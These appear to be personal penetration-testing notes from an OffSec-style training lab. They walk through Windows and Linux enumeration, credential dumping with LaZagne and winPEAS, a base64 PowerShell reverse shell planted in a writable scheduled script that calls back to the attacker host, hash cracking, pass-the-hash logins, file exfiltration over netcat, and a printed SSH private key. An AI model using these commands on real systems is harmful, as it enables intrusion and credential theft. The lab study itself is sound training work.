|   00:50:56:ab:02:9d:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41037/tcp): CLEAN (Timeout)
|   Check 2 (port 45559/tcp): CLEAN (Timeout)
|   Check 3 (port 46928/udp): CLEAN (Timeout)
|   Check 4 (port 65304/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-04-29T02:09:40
|_  start_date: N/A

???:
5040/tcp  open  unknown       syn-ack


				RDP: 
xfreerdp /u:andrea /p:'PasswordPassword_6' /v:172.16.198.15 /size:80% /drive:kali,.

PS C:\Users\andrea> whoami
relia\andrea

PS C:\Users\andrea> hostname
WK02

PS C:\Users\andrea> systeminfo
Host Name:                 WK02
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          offsec
System Type:               x64-based PC
Domain:                    relia.com
Logon Server:              \\DC02

PS C:\Users\andrea> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

PS C:\Users\andrea> net users
User accounts for \\WK02
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
offsec                   WDAGUtilityAccount

PS C:\Users\andrea> net user /domain
The request will be processed at a domain controller for domain relia.com.
User accounts for \\DC02.relia.com
-------------------------------------------------------------------------------
Administrator            andrea                   anna
brad                     dan                      Guest
iis_service              internaladmin            jenny
jim                      krbtgt                   larry
maildmz                  michelle                 milana
mountuser

				NETWORK:
PS C:\Users\andrea> ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : WK02
   Primary Dns Suffix  . . . . . . . : relia.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : relia.com
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-6B-3E
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.128.15(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.128.254
   DNS Servers . . . . . . . . . . . : 172.16.128.6
   NetBIOS over Tcpip. . . . . . . . : Enabled

PS C:\Users\andrea> route print
===========================================================================
Interface List
  6...00 50 56 ab 6b 3e ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   172.16.128.254    172.16.128.15     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     172.16.128.0    255.255.255.0         On-link     172.16.128.15    271
    172.16.128.15  255.255.255.255         On-link     172.16.128.15    271
   172.16.128.255  255.255.255.255         On-link     172.16.128.15    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link     172.16.128.15    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link     172.16.128.15    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0   172.16.128.254       1
===========================================================================
IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:

PS C:\Users\andrea> arp -A
Interface: 172.16.128.15 --- 0x6
  Internet Address      Physical Address      Type
  172.16.128.6          00-50-56-ab-31-35     dynamic
  172.16.128.254        00-50-56-ab-87-f9     dynamic
  172.16.128.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

PS C:\Users\andrea> nslookup
Default Server:  UnKnown
Address:  172.16.128.6

				DUMP CREDS: 
PS C:\Users\andrea> (Get-PSReadlineOption).HistorySavePath
C:\Users\andrea\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\Users\andrea> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\andrea\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/28/2024   9:44 PM             34 local.txt

PS C:\Users\andrea> Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue

LAZ:
########## User: andrea ##########
------------------- Keepassconfig passwords -----------------
[+] Keyfile found !!!
Keyfile: No keyfile found
Database: C:\Users\andrea\Documents\Database.kdbx
Type: Password
------------------- Credman passwords -----------------
[+] Password found !!!
URL: XboxLive
Login: None
Password: b"ECS2 \x99\xa9\xb0\x1c\x0f\xf5v\x9a\x9b7\x04\x9f\xd7\xbd\x14!m\x9c\xafO\xcde\xce\xb3N1Y\x8aI\xe3\x11K\x87h=\xfb\x8ab\x86\x8f*D\xe2P_4s\xcd\xdf\x19\xb1\xc6\x9b\x89\x19\xae\xee*\x905\xd0\xe7|%RY\x8cA\xa5v<\x86\xa5`\xa9\x08_\x8f\xa6\x04D\xc1')\x80\xeei\x87\x86\xdca \xfd+4"


				KEEYPASS: NO FILE 
C:\Users\andrea\Documents\Database.kdbx

PS C:\Users\andrea> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue -Force


				PRIV ESC: 
WINPEAS: 
LDAP://DC=relia,DC=com

          ͹ LAPS Settings
  If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

          ͹ AV Information
    Some AV was detected, search for bypasses
    Name: Windows Defender
    ProductEXE: windowsdefender://
    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe

          ͹ Users
  Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups                                            
  Current user: andrea

WK02\offsec
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-NotReq
   Is Enabled              :   True

          ͹ Logged users
    RELIA\milana
    RELIA\andrea

          ͹ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

          ͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    andrea::RELIA:1122334455667788:c89cba12eaef349543ee96b86c0d453c:010100000000000093591595039ada01290f8bb8bae2c219000000000800300030000000000000000000000000200000b74101eabba6ecb3aa3a8c951dd3a3db8418459db8e3fddd78c8958de285fbb50a00100000000000000000000000000000000000090000000000000000000000     

          ͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)                                                                                   
     File Permissions "C:\schedule.ps1": Authenticated Users [WriteData/CreateFiles]

          ͹ Found Keyring Files
File: C:\Users\andrea\AppData\Local\Microsoft\OneDrive\logs\Personal\general.keystore
File: C:\Users\andrea\AppData\Local\Microsoft\OneDrive\logs\ListSync\Business1\general.keystore

          ͹ Found Keepass Files
File: C:\Users\andrea\AppData\Roaming\KeePass\KeePass.config.xml
File: C:\Program Files\KeePass Password Safe 2\KeePass.config.xml

          ͹ Found Database Files
File: C:\Users\andrea\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\Default\heavy_ad_intervention_opt_out.db

          ͹ Found Raw Hashes-md5 Regexes
C:\Users\andrea\Desktop\local.txt: 3247bdbecab5d0a42546401d066e7284


		EDIT POWERSHELL SCRIPT WITH REV SHELL: schedule.ps1
WINPEAS: 
          ͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)                                                                                   
     File Permissions "C:\schedule.ps1": Authenticated Users [WriteData/CreateFiles]

ADD REV SHELL: to top of .ps1 > Save
https://www.revshells.com/
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA0ACIALAAyADUANgAwACkAOwAkAHbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
try {
    & C:\updatecollector\updatecollctor.exe

} catch {

    Write-Output "[-] Updates couldn't be collected!"
    Write-Output "[!] Update cache will be used"
}

copy C:\Users\milana\beyondupdater.exe C:\updater\beyondupdater.exe
Start-Sleep -Seconds 5
& "C:\updater\beyondupdater.exe"
Start-Sleep -Seconds 5
del C:\updater\beyondupdater.exe

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 2560
listening on [any] 2560 ...
connect to [192.168.45.214] from (UNKNOWN) [192.168.238.191] 62819


				Proof.txt: me
PS C:\Users\milana\Desktop> whoami
relia\milana

PS C:\Users\milana\Desktop> hostname
WK02

PS C:\Users\milana\Desktop> cat proof.txt
ec05138238459c2628a88a93181852b5

PS C:\Users\milana\Desktop> net users /domain
The request will be processed at a domain controller for domain relia.com.
User accounts for \\DC02.relia.com
-------------------------------------------------------------------------------
Administrator            andrea                   anna                     
brad                     dan                      Guest                    
iis_service              internaladmin            jenny                    
jim                      krbtgt                   larry                    
maildmz                  michelle                 milana                   
mountuser   

PS C:\Users\milana\Documents> cat flag.ps1
param (
    [string]$flag
)

Set-Content C:\Users\milana\Desktop\proof.txt


PS C:\Users\milana\Documents> ls
    Directory: C:\Users\milana\Documents
Mode                 LastWriteTime         Length Name                                             
----                 -------------         ------ ----                                             
-a----        10/27/2022   2:38 AM           2062 Database.kdbx                                    
-a----        10/26/2022   1:58 AM             78 flag.ps1    


PS C:\Users\andrea\Desktop> .\LaZagne.exe all
[+] System masterkey decrypted for 446a8ad3-e07b-425d-bfd7-d618636af0e0
[+] System masterkey decrypted for 5d540105-9202-45ec-b2f9-c70b481ee2cd
[+] System masterkey decrypted for e262c11e-d64d-4358-b1ab-dd9373b8e937
[+] System masterkey decrypted for eb35a588-f067-48fb-a2f5-8bd767901b60
########## User: SYSTEM ##########
------------------- Hashdump passwords -----------------
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:030b83437fa120c80e8d06967d8fad82:::
offsec:1001:aad3b435b51404eeaad3b435b51404ee:cf998001c44803b490a46f363a2ca812:::
------------------- Pypykatz passwords -----------------
[+] Shahash found !!!
Shahash: 65b6774d091b82d025fc5422368f9d3d34589b84
Nthash: ce3f12443651168b3793f5fbcccff9db
Login: andrea
[+] Shahash found !!!
Shahash: 1854bca244c6d6c14418f08e7dd7bb72393e1bfa
Nthash: cf998001c44803b490a46f363a2ca812
Login: offsec
[+] Shahash found !!!
Shahash: cc05155c4c307b7b41034e0693e03da7d9cc94e8
Nthash: 1cd5b1451472a6fb7cbb307272d95a40
Login: WK02$
[+] Shahash found !!!
Shahash: 8fbfacb4cd81bf90182eff93addc472fa4295327
Nthash: 2237ff5905ec2fd9ebbdfa3a14d1b2b6
Login: milana
------------------- Lsa_secrets passwords -----------------
$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   59 41 FB E2 91 8A EA 43 8E 81 B3 39 50 7F 94 23    YA.....C...9P..#
0020   CE 0D E6 32 F2 35 3C FB E0 07 79 B4 4E AD 9D 5D    ...2.5<...y.N..]
0030   04 FA 84 B3 1D F4 87 AC 94 02 13 81 C3 1E 63 3E    ..............c>
0040   72 E4 A4 40 A1 DE 79 E6 E7 FE 73 EE 04 D4 6E 53    r..@..y...s...nS
0050   0B 2C 09 6F EC B4 B6 EF A5 EA 8C 06 48 5E 8A B5    .,.o........H^..
0060   70 59 7B AC A2 1E FC 1B 81 6E EF 8C 5F 70 14 DB    pY{......n.._p..
0070   34 2D 96 76 AD F0 38 55 26 B5 6B B8 40 16 91 4F    4-.v..8U&.k.@..O
0080   56 E3 35 B4 C4 E5 86 CB 4F 47 3E F1 40 77 68 EC    V.5.....OG>.@wh.
0090   CD 62 53 44 9C CD 61 AD 10 D4 C5 49 16 E7 DD FB    .bSD..a....I....
00A0   2E 72 B3 07 55 A3 C6 02 08 1C F6 91 19 79 9D CA    .r..U........y..
00B0   D0 1F D5 FF FE 0F 74 12 53 D5 A3 FD 4B 78 5D B4    ......t.S...Kx].
00C0   1A 13 07 A6 69 1B 5D 40 76 84 13 B5 A7 EE 49 68    ....i.]@v.....Ih
00D0   BD A5 15 4B C8 2B 8A C9 3D 16 D0 33 12 AE EE DD    ...K.+..=..3....
00E0   54 34 80 A0 72 90 5D 7C 97 6C DF C7 A9 99 8B 21    T4..r.]|.l.....!
00F0   BA E6 52 58 1F C0 2E 09 32 A7 02 0A A9 39 D4 47    ..RX....2....9.G
0100   C2 F3 66 E3 77 20 EA E1 8A B9 BF EA B5 7F 48 6E    ..f.w ........Hn
DefaultPassword
0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   EB 83 33 81 05 E5 B0 86 A2 EF 26 3E E2 40 39 48    ..3.......&>.@9H
DPAPI_SYSTEM
0000   01 00 00 00 39 D8 63 A5 CE 1C 7D 3C 07 3D F3 69    ....9.c...}<.=.i
0010   01 D5 15 9E 0B A3 63 1D BC 28 87 E4 29 5B FF BB    ......c..(..)[..
0020   52 BE 65 D4 3E 15 38 B3 9C 4E 76 5A                R.e.>.8..NvZ
NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   76 A7 53 E9 85 18 B7 EC 26 E8 71 C5 C0 63 E2 45    v.S.....&.q..c.E
0020   6A 45 A3 98 84 81 95 A9 90 B1 CF 57 67 1A 26 C2    jE.........Wg.&.
0030   98 02 15 70 FF 1B 88 92 C0 6B 04 A0 35 53 71 54    ...p.....k..5SqT
0040   E5 B2 5D 9C 2A 8B C2 24 09 E2 9D 9B 05 BF 57 69    ..].*..$......Wi
0050   52 97 FC 28 12 43 4C 51 FB D5 A0 32 75 B8 DB 16    R..(.CLQ...2u...
########## User: milana ##########
------------------- Keepassconfig passwords -----------------
[+] Keyfile found !!!
Keyfile: No keyfile found
Database: C:\Users\andrea\Documents\Database.kdbx
Type: Password
[+] Keyfile found !!!
Keyfile: No keyfile found
Database: C:\Users\milana\Documents\Database.kdbx
Type: Password
########## User: andrea ##########
------------------- Keepassconfig passwords -----------------
[+] Keyfile found !!!
Keyfile: No keyfile found
Database: C:\Users\andrea\Documents\Database.kdbx
Type: Password
[+] 1854bca244c6d6c14418f08e7dd7bb72393e1bfa ok for masterkey 00642c4d-a566-4715-b9d5-95080b54f0e9
[+] 1854bca244c6d6c14418f08e7dd7bb72393e1bfa ok for masterkey 19b297d0-0749-4b06-addd-a9c413146eac
[+] 1854bca244c6d6c14418f08e7dd7bb72393e1bfa ok for masterkey 971eca3b-34df-4a85-9e11-33839b295dc2
[+] 1854bca244c6d6c14418f08e7dd7bb72393e1bfa ok for masterkey bb4c91b3-dab7-4f6b-b56e-8f45ac07dbdc
[+] 7 passwords have been found.


				CRACK NTLM HASHES: 
Nthash: ce3f12443651168b3793f5fbcccff9db
Login: andrea
hashcat -m 1000 andrea.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Nthash: cf998001c44803b490a46f363a2ca812
Login: offsec
hashcat -m 1000 offsec.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
Exhausted

Nthash: 1cd5b1451472a6fb7cbb307272d95a40
Login: WK02$
hashcat -m 1000 WK02.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
Exhausted

Nthash: 2237ff5905ec2fd9ebbdfa3a14d1b2b6
Login: milana
hashcat -m 1000 milana.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
Exhausted

xfreerdp /v:172.16.198.15 /u:milana /pth:2237ff5905ec2fd9ebbdfa3a14d1b2b6 /size:80% /drive:kali,.
NO BLANK PASSWORDS

┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-psexec -hashes 00000000000000000000000000000000:2237ff5905ec2fd9ebbdfa3a14d1b2b6 milana@172.16.198.15


			File Transfer:  
https://www.youtube.com/watch?v=kd0sZWI6Blc
https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers

SMB: Authenticated - DIDNT WORK
On Kali:
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-smbserver test . -smb2support  -username 'milana' -password '2237ff5905ec2fd9ebbdfa3a14d1b2b6'
On Windows:
net use m: \\192.168.45.214\test
copy Database.kdbx m:\

NC: DIDNT WORK
https://www.youtube.com/watch?v=VK_TiHyX_hY
Kali:
nc -l 12345 > Database.kdbx
Windows:
nc -w 2 192.168.45.214 12345 < Database.kdbx

WORKED:  you have milana's shell copy the .kdbx file then RDP with Andrea
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.214] from (UNKNOWN) [192.168.238.191] 62243
whoami
relia\milana
PS C:\Users\milana> cd Documents
cp Database.kdbx C:\Users\andrea\Downloads
PS C:\Users\milana\Documents> cp Database.kdbx C:\Users\andrea\Downloads


			CRACK: .kdbx
┌──(kali㉿kali)-[~]
└─$ keepass2john Database.kdbx > keepass.hash
┌──(kali㉿kali)-[~]
└─$ cat keepass.hash 
REMEVE: Database:
┌──(kali㉿kali)-[~]
└─$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
$keepass$*2*60*0*1a571154c68c65dc71d6bda645b1fc5132dd945c6a1380526e559a8deeefc235*af924f36b9128207e2e138fe7a47c8dfb7272ea68f549ef2d33e8b2bd26d68c7*3e526ce65982ff5ca11465ed0bd11a4f*12f7b280e61341aee2e527a96ba687984c58377eb16472c600123d11fa560e31*a2335d1597fdd70dcd53d96e8de2278cb705639a2a79fe51c130b5b15752d14a:destiny1

┌──(kali㉿kali)-[~]
└─$ keepassxc
destiny1

INSIDE: 
sarah
placeholder
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----


			DIDNT USE BUT SAVE
https://superuser.com/questions/395015/how-to-open-the-recycle-bin-from-the-windows-command-line
https://www.easeus.com/data-recovery-solution/where-is-recycle-bin-in-windows-10.html
RUN AS ADMIN: 
1.In program files go to Command Prompt and right click to run as administrator.
2. Recycle bin is a hidden file. in command prompt type cd C:\$Recycle.bin to navigate to recycle bin.
3.type dir /a to show the hidden files and directories.
eg.
C:\$Recycle.Bin>DIR /A
Volume in drive C has no label.
Volume Serial Number is 30CB-031B

Directory of C:\$Recycle.Bin
<DIR> .
<DIR> ..
<DIR> S-1-5-21-1811919633-2966830358-3406549056-1000
<DIR> S-1-5-21-1811919633-2966830358-3406549056-500
0 File(s) 0 bytes
4 Dir(s) 135,622,692,864 bytes free
.
4. A list of directories will be shown. Go into the directory using the command cd <directory name> that you see using the previous command.
eg.
C:\$Recycle.Bin>cd S-1-5-21-1811919633-2966830358-3406549056-1000

5. Next type dir */s to list all the subdirectories. Now you will be able to see all the files in the recycle bin.
C:\$Recycle.Bin\S-1-5-21-1811919633-2966830358-3406549056-1000>dir */s 


--------------------------------------------------------------------------------------------------
			.19 - local and proof ✅
┌──(kali㉿kali)-[~]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.128.19
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 61:d7:77:83:c6:48:69:ca:42:35:0e:62:c3:30:b7:b4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3H8CXisC1mZBaEAmf5fOduu1OZ+ZvIvKABevnc3F3EWNuQX77oQB8J9HwRQ/dqBEfb5FRhzBYuEOG5NDGqxY4lDidLrnb0EDgfrGml3BY6sXqQPDyWgQ4UhZa45sUzHZ5Pmo/p1jCqdLzhwlwantXk+5ybJ6h3dvcP9eFsGeKuho/KTgvjBd8ASUYAoFG227ijrKAKIBW8eOXkm2H3l0qA9BrSIGBNSYxnI7IPTnRAACFztvq2qRY517bHD5Lxs5KR6i98P//I/y9rNY7CHw7POytYW4Osj8FWRv2ReuQbxBVm7BuvRRsEKjm6eXO+imO4uFEX8ZX1mfohzu6VFpjN8uQtMSQ5csv6V3Pa1LLW61SfX8W3JBMBCAdZQ+Rdl3hfiM/DmRIHW/yZIBQ21xHeLwhWVjKSptFLDR0037DdjS4CUJ7etWhVuHn7yGlPYJLy9umPDtlFWouOFWDa4RnKI8LfBT0Tv71cGqJv5W6uL2l1waVQGR3Cx5qiQSDdr0=
|   256 f2:94:b5:71:88:a1:f8:c5:d9:47:77:6b:07:ae:27:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKozyldN+VTxMu+2OHndElEKoTVXgBFfOfqPgkCJ97Pp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

				SSH:
172.16.128.19- does not support password authentication

sarah
placeholder
destiny1

┌──(kali㉿kali)-[~/Desktop/RELIA/Sarah SSH Keys]
└─$ nano id_rsa     
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----

┌──(kali㉿kali)-[~/Desktop/RELIA/Sarah SSH Keys]
└─$ sudo chmod 600 id_rsa 

┌──(kali㉿kali)-[~/Desktop/RELIA/Sarah SSH Keys]
└─$ sudo ssh -i id_rsa sarah@172.16.122.19

$ whoami
sarah

$ hostname
backup

$ cat local.txt
90910b9a22e1c65940e25b482a7ceb55

$ id
uid=1001(sarah) gid=1001(sarah) groups=1001(sarah)

$ sudo -l
Matching Defaults entries for sarah on backup:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User sarah may run the following commands on backup:
    (ALL) NOPASSWD: /usr/bin/borg list *
    (ALL) NOPASSWD: /usr/bin/borg extract *
    (ALL) NOPASSWD: /usr/bin/borg mount *

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
sarah@backup:~$ 

sarah@backup:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.5 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

				NETWORK:
sarah@backup:~$ ip route
default via 172.16.198.254 dev ens192 proto static 
172.16.198.0/24 dev ens192 proto kernel scope link src 172.16.198.19 

sarah@backup:~$ ss -ntplu
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process  
udp    UNCONN  0       0        127.0.0.53%lo:53          0.0.0.0:*             
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*             
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             
tcp    LISTEN  0       128               [::]:22             [::]:*   

sarah@backup:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 backup
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


			USERS: amy  sarah  root
sarah@backup:/home/amy$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sarah:x:1001:1001:sarah:/home/sarah:/bin/sh
amy:x:1002:1002:Amy:/home/amy:/bin/sh
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin

sarah@backup:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied

sarah@backup:~$ env
SHELL=/bin/sh
PWD=/home/sarah
LOGNAME=sarah
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/sarah
LANG=en_US.UTF-8
LS_COLORS=rs=0:
SSH_CONNECTION=172.16.122.254 59260 172.16.122.19 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=sarah
SHLVL=1
XDG_SESSION_ID=14
XDG_RUNTIME_DIR=/run/user/1001
SSH_CLIENT=172.16.122.254 59260 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
SSH_TTY=/dev/pts/0
_=/usr/bin/env


				PRIV ESC:
LINPEAS:
python3 -m http.server 8000
wget http://192.168.45.214:8000/linpeas.sh
